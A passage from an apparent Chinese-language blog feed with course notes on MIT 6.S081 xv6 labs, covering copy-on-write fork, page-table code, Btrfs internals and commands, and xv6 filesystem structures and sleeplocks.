<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// create an empty user page table.</span></span><br><span class="line"><span class="comment">// returns 0 if out of memory.</span></span><br><span class="line"><span class="type">pagetable_t</span> <span class="title function_">uvmcreate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pagetable_t</span> pagetable;</span><br><span class="line">    pagetable = (<span class="type">pagetable_t</span>)kalloc();</span><br><span class="line">    <span class="keyword">if</span> (pagetable == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">    <span class="keyword">return</span> pagetable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相对应的是<code>uvmfree</code>，这个需要递归的释放子进程的内存，<code>freewalk</code>递归的释放了所有子进程的内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Recursively free page-table pages.</span></span><br><span class="line"><span class="comment">// All leaf mappings must already have been removed.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">freewalk</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span> &#123;</span><br><span class="line">    <span class="comment">// there are 2^9 = 512 PTEs in a page table.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">        <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">        <span class="keyword">if</span> ((pte &amp; PTE_V) &amp;&amp; (pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// this PTE points to a lower-level page table.</span></span><br><span class="line">            uint64 child = PTE2PA(pte);</span><br><span class="line">            freewalk((<span class="type">pagetable_t</span>)child);</span><br><span class="line">            pagetable[i] = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pte &amp; PTE_V) &#123;</span><br><span class="line">            panic(<span class="string">&quot;freewalk: leaf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kfree((<span class="type">void</span> *)pagetable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>kernel/proc.c</code>中, <code>proc_freepagetable</code>先调用uvmunmap释放当前进程的内存，然后调用了<code>uvmfree</code>释放子进程的pagetable</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Free a process&#x27;s page table, and free the</span></span><br><span class="line"><span class="comment">// physical memory it refers to.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">proc_freepagetable</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 sz)</span> &#123;</span><br><span class="line">    uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmfree(pagetable, sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是<code>uvmalloc</code>和<code>uvmdealloc</code>用来调整virtual memory的大小，封装调用了kalloc、memset和uvmunmap这些，这里不多说了。</p>
<p>说完用户态页表我们看一下内核页表, 在开机的时候由kvminit直接创建，这些是不参与page fault的，也没有COW或者换页那些，也不会参与TLB或者参与分页</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add a mapping to the kernel page table.</span></span><br><span class="line"><span class="comment">// only used when booting.</span></span><br><span class="line"><span class="comment">// does not flush TLB or enable paging.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kvmmap</span><span class="params">(<span class="type">pagetable_t</span> kpgtbl, uint64 va, uint64 pa, uint64 sz, <span class="type">int</span> perm)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mappages(kpgtbl, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;kvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><blockquote>
<p>Your task is to implement copy-on-write fork in the xv6 kernel. You are done if your modified kernel executes both the cowtest and usertests programs successfully.</p>
</blockquote>
<p>我们要通过修改PTE来调整内存的访问权限， PTE相关的标志为已经给出了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="comment">// valid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_R (1L &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_W (1L &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_X (1L &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_U (1L <span class="string">&lt;&lt; 4) // 1 -&gt;</span> user can access</span></span><br></pre></td></tr></table></figure>

<p><img src="/6-S081-lab-cow/1652761766.png"></p>
<p>在PTE的标志位中， 第8-9位是保留的（Reversed for supervisor software）， 我们可以把第八位指定成COW的标志位（上图RSW那里）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_COW (1L &lt;&lt; 8) <span class="comment">// cow</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Modify uvmcopy() to map the parent’s physical pages into the child, instead of allocating new pages. Clear PTE_W in the PTEs of both child and parent.</p>
</blockquote>
<p>首先我们修改<code>uvmcopy()</code>, 在copy的时候将父子进程的PTE标志位都设为只读</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Given a parent process&#x27;s page table, copy</span></span><br><span class="line"><span class="comment">// its memory into a child&#x27;s page table.</span></span><br><span class="line"><span class="comment">// Copies both the page table and the</span></span><br><span class="line"><span class="comment">// physical memory.</span></span><br><span class="line"><span class="comment">// returns 0 on success, -1 on failure.</span></span><br><span class="line"><span class="comment">// frees any allocated pages on failure.</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span> &#123;</span><br><span class="line">    <span class="type">pte_t</span> *pte;</span><br><span class="line">    uint64 pa, i;</span><br><span class="line">    uint flags;</span><br><span class="line">    <span class="type">char</span> *mem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i += PGSIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">            panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">            panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">        pa = PTE2PA(*pte);</span><br><span class="line">        *pte &amp;= ~PTE_W;</span><br><span class="line">        *pte |= PTE_COW;</span><br><span class="line">        flags = PTE_FLAGS(*pte);</span><br><span class="line">        <span class="comment">// 这里不需要立即memove分配内存了，注释掉</span></span><br><span class="line">        <span class="comment">// if ((mem = kalloc()) == 0)</span></span><br><span class="line">        <span class="comment">//     goto err;</span></span><br><span class="line">        <span class="comment">// memmove(mem, (char *)pa, PGSIZE);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mappages(new, i, PGSIZE, (uint64)pa, flags) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// kfree(mem);</span></span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">    uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Modify usertrap() to recognize page faults. When a page-fault occurs on a COW page, allocate a new page with kalloc(), copy the old page to the new page, and install the new page in the PTE with PTE_W set.</p>
</blockquote>
<p>然后发生page fault的时候（要用<code>r_scasue</code>判断是否发生原因），然后用kalloc分配内存，同时将PTE标志位从只读变为可写。</p>
<blockquote>
<p>Ensure that each physical page is freed when the last PTE reference to it goes away – but not before. A good way to do this is to keep, for each physical page, a “reference count” of the number of user page tables that refer to that page. Set a page’s reference count to one when kalloc() allocates it. Increment a page’s reference count when fork causes a child to share the page, and decrement a page’s count each time any process drops the page from its page table. kfree() should only place a page back on the free list if its reference count is zero. It’s OK to to keep these counts in a fixed-size array of integers. You’ll have to work out a scheme for how to index the array and how to choose its size. For example, you could index the array with the page’s physical address divided by 4096, and give the array a number of elements equal to highest physical address of any page placed on the free list by kinit() in kalloc.c.</p>
</blockquote>
<p>按照这个提示，我们在kalloc的时候将引用计数设为1, 在fork的时候增加引用计数，然后在进程不需要这个页的时候将引用计数减1，等到引用计数为0的时候就可以kfree了</p>
<blockquote>
<p>Modify copyout() to use the same scheme as page faults when it encounters a COW page.</p>
</blockquote>
<h2 id="闲聊一下Linux的COW漏洞"><a href="#闲聊一下Linux的COW漏洞" class="headerlink" title="闲聊一下Linux的COW漏洞"></a>闲聊一下Linux的COW漏洞</h2><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2>]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>cow</tag>
      </tags>
  </entry>
  <entry>
    <title>6.S081 Lab Filesystem 笔记</title>
    <url>/6-S081-lab-filesystem/</url>
    <content><![CDATA[<p>鸽了有点日子的6.S081的filesystem笔记，主要是看到ZFS和Btrfs之类的现代文件系统，再看看自己做的Lab，感觉跟幼儿园哄小孩玩的一样</p>
<p><img src="https://imgs.xkcd.com/comics/dark_arts.png"></p>
<p>不过，如果你只是一个路过的普通用户，懂的越少越幸福。在我接触Btrfs之前，我根本没担心过我电脑的文件系统。<br>THERE POWER LEADS ONLY TO RUIN.  </p>
<span id="more"></span>

<h2 id="文件系统笔记"><a href="#文件系统笔记" class="headerlink" title="文件系统笔记"></a>文件系统笔记</h2><p>经典的文件系统网上各种资料和介绍太多了，也无外乎inode、多级索引、引用计数、权限这些。现代文件系统比较复杂，像Btrfs的那些日志、秒级快照、COW我又不太懂不敢讲，像Ceph这些分布式的文件系统我也不太懂。我感觉像Btrfs这样的文件系统已经很像数据库了，你看b-tree索引啊日志啊COW事物啊。</p>
<p>这一篇写的比较凌乱，而且大部分内容都和Lab没关系，随便说说吧</p>
<h3 id="Btrfs"><a href="#Btrfs" class="headerlink" title="Btrfs"></a>Btrfs</h3><p>Btrfs我不太敢讲，相比ext4比较复杂、资料也更少。把台式主力的文件系统换成Btrfs后我都有些提心吊胆的，一直害怕哪一天Boom-tree-fs炸了。还好，快一年了，依然存活。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> btrfs device stats /dev/nvme0n1p1</span><br><span class="line">[/dev/nvme0n1p1].write_io_errs    0</span><br><span class="line">[/dev/nvme0n1p1].read_io_errs     0</span><br><span class="line">[/dev/nvme0n1p1].flush_io_errs    0</span><br><span class="line">[/dev/nvme0n1p1].corruption_errs  0</span><br><span class="line">[/dev/nvme0n1p1].generation_errs  0</span><br></pre></td></tr></table></figure>

<p>普通用户用Btrfs的一些好处是透明压缩、快照、COW。不过，Btrfs的问题是真要是出了什么问题会修的人不多，用ext4什么的坏了实在不行可以花钱找数据恢复，btrfs就自求多福吧（或者你在群里大喊fc老师救我，fc老师没空就自求多福吧）。而且市面上的磁盘修复工具几乎也都不怎么支持btrfs。</p>
<p>Btrfs可以直接添加、删除设备、调整大小（增加和缩小都行，XFS暂时还不支持缩）。我用Btrfs将两个500G的固态硬盘拼成了一个1T的逻辑分区（这个东西有点像LVM的逻辑卷）<br>Btrfs可以直接热插拔增删设备，比如我要加一快硬盘，直接添加然后balance一下就可以了。我要移除一块硬盘，直接remove就可以了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo btrfs device add /dev/nvme0n1p1 / -f   <span class="comment"># 添加设备</span></span><br><span class="line">sudo btrfs balance start /  <span class="comment"># 开始平衡</span></span><br><span class="line">sudo btrfs device remove /dev/nvme0n1p1</span><br></pre></td></tr></table></figure>

<p>之前用ext4等文件系统很多都习惯<code>/</code>，<code>/home</code>, <code>/var</code>，Btrfs一般不分那么多区，而是用子卷。一般对<code>var</code>这样的目录单独建一个子卷，然后禁用COW。</p>
<h4 id="B-Tree索引"><a href="#B-Tree索引" class="headerlink" title="B-Tree索引"></a>B-Tree索引</h4><p>b-tree有三种结构：keys, items, and a block header</p>
<p>block header 包括uuid和checksum之类的东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btrfs_header</span> &#123;</span></span><br><span class="line">    u8 csum[<span class="number">32</span>];</span><br><span class="line">    u8 fsid[<span class="number">16</span>];</span><br><span class="line">    __le64 bytenr;</span><br><span class="line">    __le64 flags;</span><br><span class="line"></span><br><span class="line">    u8 chunk_tree_uid[<span class="number">16</span>];</span><br><span class="line">    __le64 generation;</span><br><span class="line">    __le64 owner;</span><br><span class="line">    __le32 nritems;</span><br><span class="line">    u8 level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>key中包括了存储的数据类型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btrfs_disk_key</span> &#123;</span></span><br><span class="line">    __le64 objectid;</span><br><span class="line">    u8 type;</span><br><span class="line">    __le64 offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>item的大小是可变的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btrfs_item</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">btrfs_disk_key</span> <span class="title">key</span>;</span></span><br><span class="line">    __le32 offset;</span><br><span class="line">    __le32 size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件系统的struct放在 item data 里面，比如objectid、inode和offset这些。每个文件都有一个objectid，然后根据objectid组成了一个B-tree的索引。inode放在<code>btrfs_inode_item</code>结构体里面。</p>
<p>Btrfs的索引是b树（free space tree），每个子卷（subvolume）有一颗b-tree索引，大概长这个样子<br><img src="/6-S081-lab-filesystem/1649948946.png"></p>
<p>Btrfs中有很多的树索引，包括FS Tree(包括Extent tree, Root tree)，Chunk tree(区块索引)，Checksum tree， Device Tree。</p>
<p><img src="/6-S081-lab-filesystem/1649988331.png"></p>
<p>其中文件树（FS Tree）长这样</p>
<p><img src="/6-S081-lab-filesystem/1649949073.png"></p>
<p>Btrfs的snapshot是类似COW的操作，增量备份节点</p>
<p><img src="/6-S081-lab-filesystem/1649992014.png"></p>
<h4 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h4><p>大多数比较新的文件系统都对SSD存储的优化。这里简单说一下Btrfs的文件存储。Btrfs的一个对小文件的优化是直接塞进Metadata里面，这样就不用占一个块（block）了。大文件存在将block合并的Extent中，这样就不用每个block一个Metadata占空间了。<br>Btrfs还有一个很出名的特性是透明压缩，此外还有COW的reflink（这个不能），de-duplicaiton，这个之前写过不多说了</p>
<h4 id="关于Btrfs的性能问题"><a href="#关于Btrfs的性能问题" class="headerlink" title="关于Btrfs的性能问题"></a>关于Btrfs的性能问题</h4><p>Btrfs性能不好的说法主要来源于跑分跑不过ext4等等。不过跑分这种事情对于普通的桌面用户意义不大，以下引用fc老师的话</p>
<blockquote>
<p>phoronix 測文件系統性能的最大問題在於容易讓讀者以為文件系統是左右存儲性能的關鍵，實際上文件系統只是夾在內存子系統和塊IO子系統中間的決策層，通常瓶頸不會在文件系統，除非文件系統過度簡化設計，對存儲性能影響更大的是別的層面的東西，按他們的方式測試文件系統只能測出一堆難以預計到的副作用的結果，沒法對文件系統優化提供可供參考的提示<br>要測純讀寫做對比肯定不考慮 reflink 和透明壓縮，但是實際幹活的時候這些新特性很節省時間（</p>
</blockquote>
<p>当然Btrfs在重io的情况下桌面特别卡，那很有可能是quota的问题，把quota关掉吧，quota有已知的性能问题，尤其是在ssd上。（关了这个磁盘配额你就看不到快照大小、指定不了每个子卷的大小）</p>
<h2 id="简单说一下Lab"><a href="#简单说一下Lab" class="headerlink" title="简单说一下Lab"></a>简单说一下Lab</h2><p>这个Lab很简单，一个是让给xv6的文件系统做一个二级索引用来支持大文件，一个是让你给xv6实现一下软链接。xv6作为一个教学的系统，文件系统索引很简单，并没有像Btrfs等文件系统那样采用b-tree等树形结构。软链接的实现也很简单，就类似一个指针+引用计数嘛，不像一些现代文件系统的reflink那样类似COW的操作实现de-duplication很麻烦。</p>
<p>其实没啥好说的，但是这一篇一开始是6.S081的Lab笔记，一点Lab的内容都没有有点挂羊头卖狗肉的嫌疑。还是写点吧。</p>
<h2 id="xv6中的文件系统"><a href="#xv6中的文件系统" class="headerlink" title="xv6中的文件系统"></a>xv6中的文件系统</h2><p>这里简化起见不讲磁盘结构了。不考虑底层差异，磁盘直接被文件系统视为一连串块（block），xv6中block大小是1024k。block0一般是引导块，然后block1是superblock，然后是log, inodes，bitmap，这些统称为Metadata block。再后面都是 data block</p>
<p><img src="/6-S081-lab-filesystem/1650031214.png"></p>
<p>这里xv6的精简实现比较简单，不像linux那样很复杂，我们直接看源码好了。超级块superblock用来记录总共有多少个block、inode block、log block，以及它们的开始位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// super block describes the disk layout:</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">superblock</span> &#123;</span></span><br><span class="line">  uint magic;        <span class="comment">// Must be FSMAGIC</span></span><br><span class="line">  uint size;         <span class="comment">// Size of file system image (blocks)</span></span><br><span class="line">  uint nblocks;      <span class="comment">// Number of data blocks</span></span><br><span class="line">  uint ninodes;      <span class="comment">// Number of inodes.</span></span><br><span class="line">  uint nlog;         <span class="comment">// Number of log blocks</span></span><br><span class="line">  uint logstart;     <span class="comment">// Block number of first log block</span></span><br><span class="line">  uint inodestart;   <span class="comment">// Block number of first inode block</span></span><br><span class="line">  uint bmapstart;    <span class="comment">// Block number of first free map block</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>inode的定义也非常简单，inode在磁盘中大概就记录文件类型、大小、链接数量这些信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// On-disk inode structure</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dinode</span> &#123;</span></span><br><span class="line">  <span class="type">short</span> type;           <span class="comment">// File type</span></span><br><span class="line">  <span class="type">short</span> major;          <span class="comment">// Major device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> minor;          <span class="comment">// Minor device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> nlink;          <span class="comment">// Number of links to inode in file system</span></span><br><span class="line">  uint size;            <span class="comment">// Size of file (bytes)</span></span><br><span class="line">  uint addrs[NDIRECT+<span class="number">1</span>];   <span class="comment">// Data block addresses</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in-memory copy of an inode</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">  uint dev;           <span class="comment">// Device number</span></span><br><span class="line">  uint inum;          <span class="comment">// Inode number</span></span><br><span class="line">  <span class="type">int</span> ref;            <span class="comment">// Reference count</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> <span class="title">lock</span>;</span> <span class="comment">// protects everything below here</span></span><br><span class="line">  <span class="type">int</span> valid;          <span class="comment">// inode has been read from disk?</span></span><br><span class="line"></span><br><span class="line">  <span class="type">short</span> type;         <span class="comment">// copy of disk inode</span></span><br><span class="line">  <span class="type">short</span> major;</span><br><span class="line">  <span class="type">short</span> minor;</span><br><span class="line">  <span class="type">short</span> nlink;</span><br><span class="line">  uint size;</span><br><span class="line">  uint addrs[NDIRECT+<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在内存中inode有 refernce conut，这个就是引用计数，删除文件的时候只有当引用计数减为0的时候才会真正删除</p>
<p><img src="/6-S081-lab-filesystem/1650032123.png"></p>
<h2 id="sleeplock"><a href="#sleeplock" class="headerlink" title="sleeplock"></a>sleeplock</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Long-term locks for processes</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> &#123;</span></span><br><span class="line">  uint locked;       <span class="comment">// Is the lock held? 0是没有， 1是hold</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lk</span>;</span> <span class="comment">// spinlock protecting this sleep lock</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// For debugging:</span></span><br><span class="line">  <span class="type">char</span> *name;        <span class="comment">// Name of lock.</span></span><br><span class="line">  <span class="type">int</span> pid;           <span class="comment">// Process holding lock</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>xv6的文件系统用的是睡眠锁而不是spinlock，因为读写这种io操作耗时很长。相关定义在<code>kernel/sleeplock.c</code>，其中<code>wakeup</code>和<code>sleep</code>定义在<code>kernel/proc.c</code>， 这里就简单认为sleep操作干了<code>p-&gt;state = SLEEPING;</code>这一件事，而<code>wakeup</code>干了<code>p-&gt;state = RUNNABLE;</code>，作用是让process睡眠和唤醒</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Wake up all processes sleeping on chan.</span></span><br><span class="line"><span class="comment">// Must be called without any p-&gt;lock.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">wakeup</span><span class="params">(<span class="type">void</span> *chan)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(p != myproc())&#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == SLEEPING &amp;&amp; p-&gt;chan == chan) &#123;</span><br><span class="line">        p-&gt;state = RUNNABLE;  <span class="comment">// 这里我们只关注这一行就行了</span></span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initsleeplock</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk, <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  initlock(&amp;lk-&gt;lk, <span class="string">&quot;sleep lock&quot;</span>);</span><br><span class="line">  lk-&gt;name = name;</span><br><span class="line">  lk-&gt;locked = <span class="number">0</span>; <span class="comment">//locked = 0 没上锁，= 1 表示被锁住了</span></span><br><span class="line">  lk-&gt;pid = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">acquiresleep</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;lk-&gt;lk); <span class="comment">// 获取spinlock</span></span><br><span class="line">  <span class="keyword">while</span> (lk-&gt;locked) &#123;  <span class="comment">// 如果其他pid持有锁</span></span><br><span class="line">    sleep(lk, &amp;lk-&gt;lk); <span class="comment">//睡眠</span></span><br><span class="line">  &#125;</span><br><span class="line">  lk-&gt;locked = <span class="number">1</span>;       <span class="comment">// 上锁</span></span><br><span class="line">  lk-&gt;pid = myproc()-&gt;pid;  <span class="comment">//拿锁进程的pid</span></span><br><span class="line">  release(&amp;lk-&gt;lk); <span class="comment">//释放spinlock</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">releasesleep</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;lk-&gt;lk);</span><br><span class="line">  lk-&gt;locked = <span class="number">0</span>; <span class="comment">// 释放锁</span></span><br><span class="line">  lk-&gt;pid = <span class="number">0</span>;</span><br><span class="line">  wakeup(lk); <span class="comment">// 唤醒</span></span><br><span class="line">  release(&amp;lk-&gt;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否持有sleeplock锁</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">holdingsleep</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line">  acquire(&amp;lk-&gt;lk);</span><br><span class="line">  r = lk-&gt;locked &amp;&amp; (lk-&gt;pid == myproc()-&gt;pid); <span class="comment">// r表示当前proc的pid是否持有锁</span></span><br><span class="line">  release(&amp;lk-&gt;lk);</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sleeplock是用spinlock实现的，在中断（IO）操作的时候可以持有锁。实现比较精简，我加了点注释，不多说了。</p>
<p>ps：睡眠锁类似linux里面的信号量semaphore（后来改用mutex了）</p>
<h3 id="xv6的日志"><a href="#xv6的日志" class="headerlink" title="xv6的日志"></a>xv6的日志</h3><p>xv6的日志实现比较简单，在磁盘上有一段固定的block。<br>日志这里不多说了，log-structured的文件系统和COW这些有点跑题了。掉电恢复什么的建议买个UPS电源。</p>
<h3 id="block-cache"><a href="#block-cache" class="headerlink" title="block cache"></a>block cache</h3><p>这里就是经典的LRU和睡眠锁</p>
<h2 id="Lab内容"><a href="#Lab内容" class="headerlink" title="Lab内容"></a>Lab内容</h2><h3 id="Large-Files"><a href="#Large-Files" class="headerlink" title="Large Files"></a>Large Files</h3><blockquote>
<p>In this assignment you’ll increase the maximum size of an xv6 file. Currently xv6 files are limited to 268 blocks, or 268*BSIZE bytes (BSIZE is 1024 in xv6). This limit comes from the fact that an xv6 inode contains 12 “direct” block numbers and one “singly-indirect” block number, which refers to a block that holds up to 256 more block numbers, for a total of 12+256&#x3D;268 blocks.</p>
</blockquote>
<p>ext3支持4TB的大文件，ext4支持16TB的大文件，ZFS、Btrfs等现代文件系统支持16EB（如果你执行<code>ulimit -a</code>会显示file size (blocks)，其实这个数字是64位操作系统的上限（16EB&#x3D;2^64））</p>
<p>这里让xv6的文件系统支持大文件的做法很naive，做一个二级索引，让inode有更多block就行了。</p>
<h3 id="Symbolic-Links"><a href="#Symbolic-Links" class="headerlink" title="Symbolic Links"></a>Symbolic Links</h3><p>这个也很简单，实现一个符号链接就行了。之前看了醉卧沙场写的XFS的符号链接的实现，这里做的很顺利。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9wZWtvcGVrbzExLnNha3VyYS5uZS5qcC91bml4X3Y2L3h2Ni1ib29rL2VuL0ZpbGVfc3lzdGVtLmh0bWw=">Chapter 6 File system<i class="fa fa-external-link-alt"></i></span>  </p>
<p>下面放的链接是一些文件系统相关的文章，跟这个Lab关系并不是特别大，适合无聊的时候读着玩</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mYXJzZWVyZmMubWUvemhzL3RhZy9mc2JpLWppLmh0bWw=">fc老师的fs笔记<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9hcnhpdi5vcmcvcGRmLzE3MDcuMDg1MTQucGRm">Analyzing IO Amplification in Linux File Systems<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzYzODU0Ni8=">XFS: There and back … and there again?<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9mYXJzZWVyZmMubWUvemhzL2J0cmZzLXZzLXpmcy1kaWZmZXJlbmNlLWluLWltcGxlbWVudGluZy1zbmFwc2hvdHMuaHRtbA==">Btrfs vs ZFS 实现 snapshot 的差异<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82NzY4NjgxNw==">醉卧沙场 README - 计算机专业性文章及回答总索引<i class="fa fa-external-link-alt"></i></span> 这个知乎答主写了好多XFS的文章  </p>
